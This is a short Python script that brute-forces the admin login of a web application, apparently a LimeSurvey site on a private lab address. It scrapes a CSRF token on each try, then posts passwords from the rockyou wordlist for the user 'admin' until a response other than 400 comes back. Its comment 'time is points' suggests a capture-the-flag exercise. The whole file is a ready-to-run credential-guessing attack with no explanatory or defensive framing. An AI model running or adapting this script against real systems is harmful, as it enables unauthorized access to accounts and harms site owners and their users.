import requests, re, rockyou #As they say, time is points

geteurl = "http://10.10.100.200:49965/index.php/admin/authentication/sa/login"
posteurl = "http://10.10.100.200:49965/index.php/admin/authentication/sa/login"


def doit(pw, count = "1"):
    #"csrfToken":"ef59d7ad63acc8e1fa24187ee28d7c62e31b4068"
    token = re.findall('\"csrfToken\":\"(.*)\",', requests.get(geteurl).text)[0]
    #print(token)

    resp = requests.post(posteurl, data='YII_CSRF_TOKEN=' + token + '&authMethod=Authdb&user=admin&password='+pw+'&loginlang=default&action=login&login_submit=Login')

    print(count)
    if (resp.status_code != 400):
        print(resp)
        exit()

if __name__ == "__main__":
    
    x = 0
    for pw in rockyou.load():
        x += 1
        doit(pw, x)
